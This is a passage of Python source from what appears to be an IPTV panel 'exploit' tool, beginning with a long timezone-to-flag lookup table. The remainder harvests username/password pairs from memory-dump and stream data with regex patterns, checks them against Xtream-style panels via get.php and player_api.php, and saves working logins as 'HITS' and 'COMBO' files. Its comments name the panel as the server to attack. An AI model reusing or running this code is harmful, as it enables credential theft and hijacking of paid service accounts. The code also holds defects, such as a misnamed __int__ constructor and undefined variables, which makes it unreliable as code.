            timezone = timezone.replace('Europe/Chisinau', 'ğŸ‡²ğŸ‡©Chisinau[MD]')
            timezone = timezone.replace('Europe/Copenhagen', 'ğŸ‡©ğŸ‡°Copenhagen[DK]')
            timezone = timezone.replace('Europe/Dublin', 'ğŸ‡®ğŸ‡ªDublin[IE]')
            timezone = timezone.replace('Europe/Gibraltar', 'ğŸ‡¬ğŸ‡®Gibraltar[GI]')
            timezone = timezone.replace('Europe/Guernsey', 'ğŸ‡¬ğŸ‡¬Guernsey[GG]')
            timezone = timezone.replace('Europe/Helsinki', 'ğŸ‡«ğŸ‡®Helsinki[FI]')
            timezone = timezone.replace('Europe/Isle_of_Man', 'ğŸ‡®ğŸ‡²Isle of Man[IM]')
            timezone = timezone.replace('Europe/Istanbul', 'ğŸ‡¹ğŸ‡·Istanbul[TR]')
            timezone = timezone.replace('Europe/Jersey', 'ğŸ‡¯ğŸ‡ªJersey[JE]')
            timezone = timezone.replace('Europe/Kaliningrad', 'ğŸ‡·ğŸ‡ºKaliningrad[RU]')
            timezone = timezone.replace('Europe/Kiev', 'ğŸ‡ºğŸ‡¦Kiev[UA]')
            timezone = timezone.replace('Europe/Kirov', 'ğŸ‡·ğŸ‡ºKirov[RU]')
            timezone = timezone.replace('Europe/Kyiv', 'ğŸ‡ºğŸ‡¦Kyiv[UA]')
            timezone = timezone.replace('Europe/Lisbon', 'ğŸ‡µğŸ‡¹Lisbon[PT]')
            timezone = timezone.replace('Europe/Ljubljana', 'ğŸ‡¸ğŸ‡®Ljubljana[SI]')
            timezone = timezone.replace('Europe/London', 'ğŸ‡¬ğŸ‡§London[GB]')
            timezone = timezone.replace('Europe/Luxembourg', 'ğŸ‡±ğŸ‡ºLuxembourg[LU]')
            timezone = timezone.replace('Europe/Madrid', 'ğŸ‡ªğŸ‡¸Madrid[ES]')
            timezone = timezone.replace('Europe/Malta', 'ğŸ‡²ğŸ‡¹Malta[MT]')
            timezone = timezone.replace('Europe/Mariehamn', 'ğŸ‡¦ğŸ‡½Mariehamn[AX]')
            timezone = timezone.replace('Europe/Minsk', 'ğŸ‡§ğŸ‡¾Minsk[BY]')
            timezone = timezone.replace('Europe/Monaco', 'ğŸ‡²ğŸ‡¨Monaco[MC]')
            timezone = timezone.replace('Europe/Moscow', 'ğŸ‡·ğŸ‡ºMoscow[RU]')
            timezone = timezone.replace('Europe/Nicosia', 'ğŸ‡¨ğŸ‡¾Nicosia[CY]')
            timezone = timezone.replace('Europe/Oslo', 'ğŸ‡³ğŸ‡´Oslo[NO]')
            timezone = timezone.replace('Europe/Paris', 'ğŸ‡«ğŸ‡·Paris[FR]')
            timezone = timezone.replace('Europe/Podgorica', 'ğŸ‡²ğŸ‡ªPodgorica[ME]')
            timezone = timezone.replace('Europe/Prague', 'ğŸ‡¨ğŸ‡¿Prague[CZ]')
            timezone = timezone.replace('Europe/Riga', 'ğŸ‡±ğŸ‡»Riga[LV]')
            timezone = timezone.replace('Europe/Rome', 'ğŸ‡®ğŸ‡¹Rome[IT]')
            timezone = timezone.replace('Europe/Samara', 'ğŸ‡·ğŸ‡ºSamara[RU]')
            timezone = timezone.replace('Europe/San_Marino', 'ğŸ‡¸ğŸ‡²San Marino[SM]')
            timezone = timezone.replace('Europe/Sarajevo', 'ğŸ‡§ğŸ‡¦Sarajevo[BA]')
            timezone = timezone.replace('Europe/Saratov', 'ğŸ‡·ğŸ‡ºSaratov[RU]')
            timezone = timezone.replace('Europe/Simferopol', 'ğŸ‡ºğŸ‡¦Simferopol[UA]')
            timezone = timezone.replace('Europe/Skopje', 'ğŸ‡²ğŸ‡°Skopje[MK]')
            timezone = timezone.replace('Europe/Sofia', 'ğŸ‡§ğŸ‡¬Sofia[BG]')
            timezone = timezone.replace('Europe/Stockholm', 'ğŸ‡¸ğŸ‡ªStockholm[SE]')
            timezone = timezone.replace('Europe/Tallinn', 'ğŸ‡ªğŸ‡ªTallinn[EE]')
            timezone = timezone.replace('Europe/Tirane', 'ğŸ‡¦ğŸ‡±Tirane[AL]')
            timezone = timezone.replace('Europe/Tiraspol', 'ğŸ‡µğŸ‡±Tiraspol[PL]')
            timezone = timezone.replace('Europe/Ulyanovsk', 'ğŸ‡·ğŸ‡ºUlyanovsk[RU]')
            timezone = timezone.replace('Europe/Uzhgorod', 'ğŸ‡ºğŸ‡¦Uzhgorod[UA]')
            timezone = timezone.replace('Europe/Vaduz', 'ğŸ‡±ğŸ‡®Vaduz[LI]')
            timezone = timezone.replace('Europe/Vatican', 'ğŸ‡»ğŸ‡¦Vatican City[VA]')
            timezone = timezone.replace('Europe/Vienna', 'ğŸ‡¦ğŸ‡¹Vienna[AT]')
            timezone = timezone.replace('Europe/Vilnius', 'ğŸ‡±ğŸ‡¹Vilnius[LT]')
            timezone = timezone.replace('Europe/Volgograd', 'ğŸ‡·ğŸ‡ºVolgograd[RU]')
            timezone = timezone.replace('Europe/Warsaw', 'ğŸ‡µğŸ‡±Warsaw[PL]')
            timezone = timezone.replace('Europe/Zagreb', 'ğŸ‡­ğŸ‡·Zagreb[HR]')
            timezone = timezone.replace('Europe/Zaporozhye', 'ğŸ‡ºğŸ‡¦Zaporozhye[UA]')
            timezone = timezone.replace('Europe/Zurich', 'ğŸ‡¨ğŸ‡­Zurich[CH]')
            timezone = timezone.replace('Iceland', 'ğŸ‡®ğŸ‡¸Iceland[IS]')
            timezone = timezone.replace('Indian/Antananarivo', 'ğŸ‡²ğŸ‡¬Antananarivo[MG]')
            timezone = timezone.replace('Indian/Chagos', 'ğŸ‡®ğŸ‡´Chagos[IO]')
            timezone = timezone.replace('Indian/Christmas', 'ğŸ‡¨ğŸ‡½Christmas[CC]')
            timezone = timezone.replace('Indian/Cocos', 'ğŸ‡¨ğŸ‡¨Cocos[CC]')
            timezone = timezone.replace('Indian/Comoro', 'ğŸ‡°ğŸ‡²Comoro[KM]')
            timezone = timezone.replace('Indian/Kerguelen', 'ğŸ‡¹ğŸ‡«Kerguelen[TF]')
            timezone = timezone.replace('Indian/Mahe', 'ğŸ‡¸ğŸ‡¨Mahe[SC]')
            timezone = timezone.replace('Indian/Maldives', 'ğŸ‡²ğŸ‡»Maldives[MV]')
            timezone = timezone.replace('Indian/Mauritius', 'ğŸ‡²ğŸ‡ºMauritius[MU]')
            timezone = timezone.replace('Indian/Mayotte', 'ğŸ‡¾ğŸ‡¹Mayotte[YT]')
            timezone = timezone.replace('Indian/Reunion', 'ğŸ‡·ğŸ‡ªReunion[RE]')
            timezone = timezone.replace('Kwajalein', 'ğŸ‡²ğŸ‡­Kwajalein[MH]')
            timezone = timezone.replace('Mexico/BajaNorte', 'ğŸ‡²ğŸ‡½Baja Norte[MX]')
            timezone = timezone.replace('Mexico/BajaSur', 'ğŸ‡²ğŸ‡½Baja Sur[MX]')
            timezone = timezone.replace('Mexico/General', 'ğŸ‡²ğŸ‡½General[MX]')
            timezone = timezone.replace('NZ', 'ğŸ‡³ğŸ‡¿New Zealand[NZ]')
            timezone = timezone.replace('NZ-CHAT', 'ğŸ‡³ğŸ‡¿Chatham Islands[NZ]')
            timezone = timezone.replace('Navajo', 'Navajo')
            timezone = timezone.replace('Pacific/Apia', 'ğŸ‡¼ğŸ‡¸Apia[WS]')
            timezone = timezone.replace('Pacific/Auckland', 'ğŸ‡³ğŸ‡¿Auckland[NZ]')
            timezone = timezone.replace('Pacific/Bougainville', 'ğŸ‡µğŸ‡¬Bougainville[PG]')
            timezone = timezone.replace('Pacific/Chatham', 'ğŸ‡³ğŸ‡¿Chatham[NZ]')
            timezone = timezone.replace('Pacific/Chuuk', 'ğŸ‡«ğŸ‡²Chuuk[FM]')
            timezone = timezone.replace('Pacific/Easter', 'ğŸ‡¨ğŸ‡±Easter Island[CL]')
            timezone = timezone.replace('Pacific/Efate', 'ğŸ‡»ğŸ‡ºEfate[VU]')
            timezone = timezone.replace('Pacific/Enderbury', 'ğŸ‡°ğŸ‡®Enderbury[KI]')
            timezone = timezone.replace('Pacific/Fakaofo', 'ğŸ‡¹ğŸ‡°Fakaofo[TK]')
            timezone = timezone.replace('Pacific/Fiji', 'ğŸ‡«ğŸ‡¯Fiji[FJ]')
            timezone = timezone.replace('Pacific/Funafuti', 'ğŸ‡¹ğŸ‡»Funafuti[TV]')
            timezone = timezone.replace('Pacific/Galapagos', 'ğŸ‡ªğŸ‡¨Galapagos[EC]')
            timezone = timezone.replace('Pacific/Gambier', 'ğŸ‡µğŸ‡«Gambier Islands[PF]')
            timezone = timezone.replace('Pacific/Guadalcanal', 'ğŸ‡¸ğŸ‡§Guadalcanal[SB]')
            timezone = timezone.replace('Pacific/Guam', 'ğŸ‡¬ğŸ‡ºGuam[GU]')
            timezone = timezone.replace('Pacific/Honolulu', 'ğŸ‡ºğŸ‡¸Honolulu[US]')
            timezone = timezone.replace('Pacific/Johnston', 'ğŸ‡ºğŸ‡¸Johnston[US]')
            timezone = timezone.replace('Pacific/Kanton', 'ğŸ‡°ğŸ‡®Kanton[KI]')
            timezone = timezone.replace('Pacific/Kiritimati', 'ğŸ‡°ğŸ‡®Kiritimati[KI]')
            timezone = timezone.replace('Pacific/Kosrae', 'ğŸ‡«ğŸ‡²Kosrae[FM]')
            timezone = timezone.replace('Pacific/Kwajalein', 'ğŸ‡²ğŸ‡­Kwajalein[MH]')
            timezone = timezone.replace('Pacific/Majuro', 'ğŸ‡²ğŸ‡­Majuro[MH]')
            timezone = timezone.replace('Pacific/Marquesas', 'ğŸ‡µğŸ‡«Marquesas Islands[PF]')
            timezone = timezone.replace('Pacific/Midway', 'ğŸ‡ºğŸ‡¸Midway[US]')
            timezone = timezone.replace('Pacific/Nauru', 'ğŸ‡³ğŸ‡·Nauru[NR]')
            timezone = timezone.replace('Pacific/Niue', 'ğŸ‡³ğŸ‡ºNiue[NU]')
            timezone = timezone.replace('Pacific/Norfolk', 'ğŸ‡³ğŸ‡«Norfolk Island[NF]')
            timezone = timezone.replace('Pacific/Noumea', 'ğŸ‡³ğŸ‡¨Noumea[NC]')
            timezone = timezone.replace('Pacific/Pago_Pago', 'ğŸ‡¦ğŸ‡¸Pago Pago[AS]')
            timezone = timezone.replace('Pacific/Palau', 'ğŸ‡µğŸ‡¼Palau[PW]')
            timezone = timezone.replace('Pacific/Pitcairn', 'ğŸ‡µğŸ‡³Pitcairn Islands[PN]')
            timezone = timezone.replace('Pacific/Pohnpei', 'ğŸ‡«ğŸ‡²Pohnpei[FM]')
            timezone = timezone.replace('Pacific/Ponape', 'ğŸ‡«ğŸ‡²Ponape[FM]')
            timezone = timezone.replace('Pacific/Port_Moresby', 'ğŸ‡µğŸ‡¬Port Moresby[PG]')
            timezone = timezone.replace('Pacific/Rarotonga', 'ğŸ‡¨ğŸ‡°Rarotonga[CK]')
            timezone = timezone.replace('Pacific/Saipan', 'ğŸ‡²ğŸ‡µSaipan[MP]')
            timezone = timezone.replace('Pacific/Samoa', 'ğŸ‡¼ğŸ‡¸Samoa[WS]')
            timezone = timezone.replace('Pacific/Tahiti', 'ğŸ‡µğŸ‡«Tahiti[PF]')
            timezone = timezone.replace('Pacific/Tarawa', 'ğŸ‡°ğŸ‡®Tarawa[KI]')
            timezone = timezone.replace('Pacific/Tongatapu', 'ğŸ‡¹ğŸ‡´Tongatapu[TO]')
            timezone = timezone.replace('Pacific/Truk', 'ğŸ‡«ğŸ‡²Truk[FM]')
            timezone = timezone.replace('Pacific/Wake', 'ğŸ‡ºğŸ‡¸Wake[US]')
            timezone = timezone.replace('Pacific/Wallis', 'ğŸ‡¼ğŸ‡«Wallis[WF]')
            timezone = timezone.replace('Pacific/Yap', 'ğŸ‡«ğŸ‡²Yap[FM]')
            timezone = timezone.replace('Poland', 'ğŸ‡µğŸ‡±Poland[PL]')
            timezone = timezone.replace('Portugal', 'ğŸ‡µğŸ‡¹Portugal[PT]')
            timezone = timezone.replace('ROC', 'ğŸ‡¹ğŸ‡¼Taiwan[TW]')
            timezone = timezone.replace('ROK', 'ğŸ‡°ğŸ‡·South Korea[KR]')
            timezone = timezone.replace('Singapore', 'ğŸ‡¸ğŸ‡¬Singapore[SG]')
            timezone = timezone.replace('UCT', 'ğŸŒUCT')
            timezone = timezone.replace('US/Alaska', 'ğŸ‡ºğŸ‡¸Alaska[US]')
            timezone = timezone.replace('US/Aleutian', 'ğŸ‡ºğŸ‡¸Aleutian[US]')
            timezone = timezone.replace('US/Arizona', 'ğŸ‡ºğŸ‡¸Arizona[US]')
            timezone = timezone.replace('US/Central', 'ğŸ‡ºğŸ‡¸Central[US]')
            timezone = timezone.replace('US/East-Indiana', 'ğŸ‡ºğŸ‡¸East Indiana[US]')
            timezone = timezone.replace('US/Eastern', 'ğŸ‡ºğŸ‡¸Eastern[US]')
            timezone = timezone.replace('US/Hawaii', 'ğŸ‡ºğŸ‡¸Hawaii[US]')
            timezone = timezone.replace('US/Indiana-Starke', 'ğŸ‡ºğŸ‡¸Indiana-Starke[US]')
            timezone = timezone.replace('US/Michigan', 'ğŸ‡ºğŸ‡¸Michigan[US]')
            timezone = timezone.replace('US/Mountain', 'ğŸ‡ºğŸ‡¸Mountain[US]')
            timezone = timezone.replace('US/Pacific', 'ğŸ‡ºğŸ‡¸Pacific[US]')
            timezone = timezone.replace('US/Samoa', 'ğŸ‡ºğŸ‡¸Samoa[US]')
            timezone = timezone.replace('UTC', 'ğŸŒUTC')
            timezone = timezone.replace('Universal', 'ğŸŒUniversal')
            timezone = timezone.replace('W-SU', 'W-SU')
            timezone = timezone.replace('WET', 'WET')
            timezone = timezone.replace('Zulu', 'Zulu')
            hitData.timezone = timezone
            realm = reponseMessage.split('url":')[1]
            realm = realm.split(',')[0]
            realm = realm.replace('"', "")
            hitData.real = realm
            port = reponseMessage.split('port":')[1]
            port = port.split(',')[0]
            port = port.replace('"', "")
            hitData.port = port
            outputFormats = reponseMessage.split('output_formats":')[1]
            outputFormats = outputFormats.split('"]}')[0]
            outputFormats = outputFormats.replace('","', ', ')
            outputFormats = outputFormats.replace('["', '')
            hitData.outputFormats = outputFormats
            timeInfo = reponseMessage.split('exp_date":')[1]
            timeInfo = timeInfo.split(',')[0]
            timeInfo = timeInfo.replace('"', "")
            if timeInfo == "null":
                hitData.caducidad = "#ğ–€ğ–“ğ–‘ğ–ğ–’ğ–ğ–™ğ–Šğ–‰"
            else:
                hitData.caducidad = (datetime.datetime.fromtimestamp(int(timeInfo)).strftime('%d.%b.%Y %H:%M'))

        except Exception as err:
            print("Error ao tentar achar os canais:", err)
    #creamos la url para solicitar la lista y devolvemos la invocacion a la url, que sera la lista de canales
    def extractChannelListM3U_FromUSER_PASS(self, panel, user, passw):
        url="http://" + panel + "/player_api.php?username=" + user + "&password=" + passw + "&action=get_live_categories"
        print("Extraindo lista de canais: ",url)
        try:
            ses=requests.session()
            res = ses.get(url, headers=self.getHeaderM3U_withHOST(panel), timeout=15, verify=False)
            return self.createChannelList(str(res.text))
        except Exception as errp:
            return "Error ao tentar achar os canais:",errp

    # crea una lista de los canales recibidos
    def createChannelList(self, listlink):
        # si existen varios datos de canales, creo una lista
        canal = ""
        categoria = ""
        if listlink.count('category_name":"') > 1:
            for i in listlink.split('category_name":"'):
                try:
                    canal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/', '/')
                    
                    canal = canal.replace('[', '')
                except:
                    canal = ""
                categoria = categoria + canal + "Â«â—‹Â»"
                categoria = categoria.replace('{Â«â—‹Â»','')
            return categoria
        else:
            return " No data "

def separarUserPass(entrada:str):
    try:
        protocolo="http"
        if (entrada.find("https"))>=0:
            protocolo="https"
        entrada = entrada.replace("/", "")
        separador = "get.php"
        separado = entrada.split(separador)
        url = separado[0].replace("https:", "")
        url = url.replace("http:", "")
        separador = "username="
        separado = entrada.split(separador)
        separado = separado[1].split("password=")
        user = separado[0].replace("&","")
        separado = separado[1].split("&")
        password = separado[0]
        return protocolo,url,user, password
    except:
        return ""


#metodo que verifica una url entera formato m3u con user y pass, le paso un id de canal que debe existir, no es extraer el servidor multimedia
def checkFullM3U_URL(entradaURL:str,_session):
    protocolo,url,user,passw=separarUserPass(entradaURL)
    urlEntrada=url
    #check real url for play a channel
    urlPlayerInfo = "http://" + url + "/player_api.php?username=" + str(user) + "&password=" + str(passw)
    print("Tentandoi obter informaÃ§Ãµes de: ",urlPlayerInfo)
    try:
        res = _session.get(urlPlayerInfo, headers=hea3(url), timeout=(5, 15), allow_redirects=False, stream=True)
        if res.status_code==200:
            datos=json.loads(res.text)
            if (datos["user_info"]["auth"]==0):
                return "KO","","",""
            urlReal=datos["server_info"]["url"]+":"+datos["server_info"]["port"]
            urlReal=urlReal.replace("https://","")
            urlReal = urlReal.replace("http://", "")
            url=urlReal
            puerto=datos["server_info"]["port"]
            return "OK","","",""
        else:
            return "KO","","",""
    except Exception as errp:
        print("error intentado accedes al servidor como m3u:",errp)
        return "KO", "", "", ""

def hea3(panel):
    hea = {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }
    return hea
# ---------------------------------------------M3U_UTILS--------------------------------------------------
#clase encargada de escribir los ficheros de volcado de la memoria a disco
class OutputFileWriter:
    nombreBase:str
    maxSizeperFile:int
    nombreActual:str
    contador:int

    def __int__(self, _nombreBase:str):
        self.nombreBase=_nombreBase
        self.nombreActual=self.nombreBase
        self.contador+=1
    def initValues(self,serverURL):
        self.nombreBase=serverURL.replace(":","_")
        self.nombreBase = self.nombreBase.replace(".", "_")
        self.nombreActual=self.nombreBase
        self.contador=1

    def writeToFile(self,entrada:str):
        try:
            nombreFICHERO=rootDir+"/debug/" + self.nombreActual + ".txt"
            fichero=open(nombreFICHERO,"a")
            file_size = os.path.getsize(nombreFICHERO)
            if (file_size / 1024) > 3000:  # para dividir el fichero de entrada en trozos
                self.nombreActual = self.nombreBase + "_"+str(self.contador)
                self.contador+=1
                fichero = open(rootDir+"/debug/"+self.nombreActual+".txt", "a")
            fichero.write(entrada)
            fichero.close()
        except Exception as errp:
            print("Error writing to DUMP output file:",errp)
#---------------------------------------------SCANPORTS--------------------------------------------------
    
#Clase encargada de almacenar los datos para un esquema productor/consumidor
class DataContainer:
    colaFifo:PriorityQueue
    lock
    def __init__(self):
        self.colaFifo = PriorityQueue()
        self.lock = threading.Lock()

    def put(self,entrada):
        self.lock.acquire()
        self.colaFifo.put(entrada)
        self.lock.release()
    def get(self):
        return self.colaFifo.get()

#---------------------------------------------DatosServerM3U---------------------------------------------
class DatosServerM3U:

    puertoBaseSERVER=0
    host=""
    panelM3u=""
    protocoloSERVER= "http"
    canal=""
    panelHost=""
    panelProtocolo="http"
    m3uURL=""
    panelPuerto=0
    misHeaders = {
        'Accept': '*/*',
        'Accept-Language': 'es',
        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
        'Range': 'bytes=0-'
    }
    def printInfoServer(self):
        print("Host del panel-->", self.panelHost)
        print("Puerto del Panel--->",self.panelPuerto)
        print("Puerto del Server--->", self.puertoBaseSERVER)
        print("\tURL del panel-->",self.m3uURL)
        if self.puertoBaseSERVER==None:
            self.puertoBaseSERVER=80
        print("\tservidor final:", self.protocoloSERVER+"://"+self.host+":"+str(self.puertoBaseSERVER))
        print("\tHost Servidor Final-->", self.host)
        print("\tServidor Final protocolo-->", self.protocoloSERVER)
        print("\tCanal utilizado-->", self.canal)

    def __str__(self):
        return self.panelProtocolo+"://"+self.panelHost+"--->"+self.protocoloSERVER+"://"+self.host+":"+str(
            self.puertoBaseSERVER)
    #Lee la lista m3u de entrada, si tiene _plus al final lo quita, solo aceptamos ese formato
    def extraerCanalFromM3U(self,_m3u:str):
        try:
            _m3u=_m3u.replace("_plus","")
            m3u8_obj = m3u8.load(_m3u,headers=self.misHeaders)
            playlist = [el['uri'] for el in m3u8_obj.data['segments']]
            sesion = requests.Session()
            canal = playlist[50]
            return canal
        except Exception as errp:
            print("\33[31mError accediendo a la m3u(verificar que llegamos)\33[0m:",errp)
            return ""

    #Se le pasa una m3u como parametro, para hacer la busqueda del servidor multimedia final
    def extraerServerFinal(self,_m3uURL):
        try:
            canal=self.extraerCanalFromM3U(_m3uURL)
            self.m3uURL=_m3uURL
            if canal!="":
                panelParser=urlparse(_m3uURL)
                self.panelHost=panelParser.netloc.split(":")[0] #si tiene puerto se lo quito
                self.panelProtocolo=panelParser.scheme
                self.panelPuerto=panelParser.port
                sesion=requests.Session()
                respuesta = sesion.get(url=canal, stream=False, allow_redirects=False)
                self.canal=canal
                if 'Location' in respuesta.headers:
                    miparser=urlparse(respuesta.headers["Location"])
                    self.panelM3u=_m3uURL
                    self.host=miparser.hostname
                    self.puertoBaseSERVER=miparser.port
                    self.protocoloSERVER=miparser.scheme
                    return self
            #no tiene redireccion, para los datos directos de la m3u o es una ip solo
            miparser = urlparse(_m3uURL)
            self.panelM3u = _m3uURL
            if miparser.hostname==None:
                self.host=_m3uURL
                self.panelHost = _m3uURL
            else:
                self.host = miparser.hostname
                self.panelHost = miparser.hostname
            if miparser.port==None:
                self.puertoBaseSERVER=80
                self.panelPuerto=80
            else:
                self.puertoBaseSERVER = miparser.port
                self.panelPuerto= miparser.port
            if miparser.scheme==None:
                self.panelProtocolo = ""
                self.protocoloSERVER = ""
            else:
                self.panelProtocolo=miparser.scheme
                self.protocoloSERVER=miparser.scheme
            return self
        except Exception as errp:
            print("Error:",errp)

    def __eq__(self, other):
        return self.m3uURL == other.m3uURL

    def __gt__(self, other):
        return self.m3uURL > other.m3uURL

#Clase encargada de analizar los flujos de entrada, buscando los patrones conocidos y extraer asi los user/pass
#Tambien genera las url m3u validas para esos usuarios
#Esta clase hace de consumidor
class DataAnalyzer:
    miDataContainer:DataContainer
    patronURL_USERNAME_PASSWORD= "username=[A-z0-9_*!Â¡@$?Â¿:\-\.@]*\&password=[A-z0-9_*!Â¡@$?Â¿:\-\.@]*"
    patronLISTACANAL_M3U="https?:\/[\/A-z0-9_*!Â¡@$?.%Â¿:\-]{3,}"#https?://([A-z0-9_*!Â¡@$?.%Â¿:\-]*/){3,}([A-z0-9_*!Â¡@$?.%Â¿:\-]*)
    patronREQUEST_URI = "username=([A-z0-9_*!Â¡@$?Â¿:\-\.@]*\&password=[A-z0-9_*!Â¡@$?Â¿:\-\.@]*)(REQUEST_METHOD)"
    patronTOKEN="https?:\/\/[A-z0-9_*!Â¡@$?.%Â¿:\/]{4,}\/[A-z0-9_*!Â¡@$?.%Â¿:\-]*token"
    patronLIVE= "live\/[A-z0-9_*!Â¡@$?.%Â¿:\-]{2,}\/[A-z0-9_*!Â¡@$?Â¿\-]{2,}"
    patronEXTINF="\/([A-z0-9_*!Â¡@$?.%Â¿:\-]*/){4,}([A-z0-9_*!Â¡@$?.%Â¿:\-]*)#EXTINF"
    contenedorUSER_PASS:dict
    urlBASE=""
    protocoloBase=""
    puertoBase=""
    primeraVez=True
    nombreFicheroCombos=""
    miDS:DatosServerM3U

    #Metodo para almacenar los datos basicos del server a atacar e inicializar datos de ataque. con estos datos se contruyen las listas
    def setURLBase(self,_miDS:DatosServerM3U):
        self.urlBASE = _miDS.panelHost
        self.protocoloBase = _miDS.panelProtocolo
        self.puertoBase = _miDS.panelPuerto
        self.nombreFicheroCombos = (rootDir + "/Hits/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğ‚ğğŒğğ/" + "COMBO_" + self.urlBASE.replace(".", "_").replace(":","_") + ".txt")
        self.miDS=_miDS

    def validarM3U(self,entrada: str):
        HEADER1_m3u ={
        "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    }
        miM3U_UTILS=M3U_UTILS()
        protocolo, url, user, passw = separarUserPass(entrada)
        salida = entrada.replace("get.php", "player_api.php")
        session = requests.Session()
        print("Invoking: "+salida)
        try:
            miHitData = HitData()
            respuesta = session.get(url=salida,headers=HEADER1_m3u, timeout=5)
            datosLista=respuesta.json()
            if (respuesta.status_code == 200) and (datosLista['user_info']['auth']!=0):
                    #miPortalScanner = PortalScanner("", "", 1, "", False, "", 0)
                    valorScanner, urlServer, puerto, procolo = checkFullM3U_URL(entrada, session)
                    if ((valorScanner.find("OK") >= 0) or (valorScanner.find("KOK") >= 0)):
                        if (valorScanner.find("KOK") >= 0):
                            miHitData.m3uValid = "ğ‘¶ğ‘­ğ‘­ğ‘³ğ‘°ğ‘µğ‘¬ğŸ–¤"
                        else:
                            miHitData.m3uValid = "ğ—”ğ—–ğ—§ğ—œğ—©ğ—˜ğŸ’š"
                    miHitData.real = url
                    miHitData.url = url
                    miHitData.nick = nick
                    miHitData.m3uURL = entrada
                    miM3U_UTILS.extractDataFromList(user, passw, respuesta.text, url, miHitData)
                    listaCanales=miM3U_UTILS.extractChannelListM3U_FromUSER_PASS(url, user, passw)
                    miHitData.livelist=listaCanales
                    return miHitData
            else:
                    #if datosLista['user_info']['auth']==0: #lista no activa, pero era valida, baneada? caducada?
                    return ""

        except Exception as errp:
            print("Erro ao analisar o URL:", errp)
            return ""
        print(respuesta.text)

    #Escribe los combos que se van encontrado, el nombre del fichero es el nombre del servidor
    def writeComboToFile(self,user,passw):
        try:
            fichero = open(self.nombreFicheroCombos, "a")
            fichero.write(user+":"+passw)
            fichero.write("\n")
            fichero.close()
        except Exception as errp:
            cadena = "\33[31;40mErro ao gravar no arquivo Combo" + errp + "\33[0m"

            print (cadena)

    #lee el combo generado en ejecuciones anteriores, con estos datos evitamos repeticion de listas en distintas ejecucione
    def readComboFromFile(self,miDiccionario:dict):
        try:
                if os.path.exists(self.nombreFicheroCombos) == True:
                    texto = "\33[30;47mLendo arquivo de combo anterior _" + self.nombreFicheroCombos + "\33[0m"
                    with open(self.nombreFicheroCombos, 'r')  as f:
                        # Leer todas las lÃ­neas del fichero
                        lines = f.readlines()

                    for line in lines:
                        # Separar la lÃ­nea en clave y valor utilizando los dos puntos como separador
                        key, value = line.split(':')
                        # AÃ±adir la clave y el valor al diccionario
                        miDiccionario[key] = value

                    texto = "\33[30;47mTotal de combos gerados _" + str(len(self.contenedorUSER_PASS)) + "\33[0m"
                    print(texto)

        except Exception as errp:
            print("\33[31mErro ao ler arquivo de combo " + self.nombreFicheroCombos + " => " + errp + "\33[0m")

    #metodo que genera la m3u y graba los HITs a los distintos ficheros
    def generateURL_m3u(self, _user,passw):
        global hitc
        try:
            hitc=hitc+1
            print("\33[32m\n       âœ¦ â„ ğˆ ğ•‹ - ğ„ ğ• ğ ğ•ƒ ğ ğ•€ ğ“ âœ¦       \n\n\33[0mUSER:PASS: \33[32m"+_user+":"+passw+"\33[33m\n")
            if (self.puertoBase!="") and (self.puertoBase!=None): #verificamos que tenga puerto la url
                urlM3U=self.protocoloBase+"://"+self.urlBASE+":"+str(self.puertoBase)+"/get.php?username="+_user+"&password="+passw+"&type=m3u_plus"
            else:
                urlM3U = self.protocoloBase + "://" + self.urlBASE + "/get.php?username=" + _user + "&password=" + passw + "&type=m3u_plus"

            nombreFricheroM3U_OK=(rootDir+"/HITS/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğ‡ğˆğ“ğ’/âœ¦ğ„ğ—{"+self.urlBASE.replace(".","_").replace(":","_")+"}#"+nick+"{Hits}.txt")
            nombreFricheroM3U_LISTA=(rootDir+"/HITS/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğŒğŸ‘ğ”/âœ¦ğ„ğ—{"+self.urlBASE.replace(".","_")+"}#"+nick+"{M3u}.txt")
            nombreFricheroM3U_COMBO = (rootDir + "/HITS/ğ„ğ±ğ©ğ¥ğ¨ğ¢ğ­/ğ‚ğğŒğğ/âœ¦ğ„ğ—{" + self.urlBASE.replace(".", "_").replace(":","_") + "}#"+nick+"{Combo}.txt")

            ficheroCOMBO=open(nombreFricheroM3U_COMBO,"a", encoding="utf8")
            ficherFULL=open(nombreFricheroM3U_OK,"a", encoding="utf8")
            fichero_nombreFricheroM3U_COMBO=open(nombreFricheroM3U_LISTA,"a", encoding="utf8")

            if (self.primeraVez):#fecha de ejecucion, solo la primera vez en cada ejecucion
                self.primeraVez = False
                ficherFULL.write(""+time.asctime()+"")
            miHidata=self.validarM3U(urlM3U)
            if miHidata!='':
                ficherFULL.write(str(miHidata))
                ficherFULL.write("\n")
                ficherFULL.close()
                ficheroCOMBO.write(_user+":"+passw+"\n")
                ficheroCOMBO.close()
                fichero_nombreFricheroM3U_COMBO.write(miHidata.m3uURL+"\n")
                fichero_nombreFricheroM3U_COMBO.close()
                fichero_nombreFricheroM3U_COMBO.close()
                return miHidata
        except Exception as errp:
            print("\33[31mError writing to the HITS file!!!!!\33]0m",errp)
            quit()

    def extractDataRequestEXTINF(self,entrada:str):
        try:
            datos = entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return user, passw
        except Exception as errp:
            cadena = "\33[31;40mErro ao processar extraÃ§Ã£o de dados de REQUEST_EXTINF:" + errp + " dados de entrada:" + entrada + "\33[0m"
            print(cadena)
            return "", ""
    def extractDataRequestLIVE(self,entrada:str):
        try:
            datos = entrada.split("/")
            user = datos[1]
            passw = datos[2]
            return user, passw
        except Exception as errp:
            cadena = "\33[31;40mErro ao processar extraÃ§Ã£o de dados de REQUEST_LIVE:" + errp + " dados de entrada:" + entrada + "\33[0m"
            print(cadena)
            return "", ""
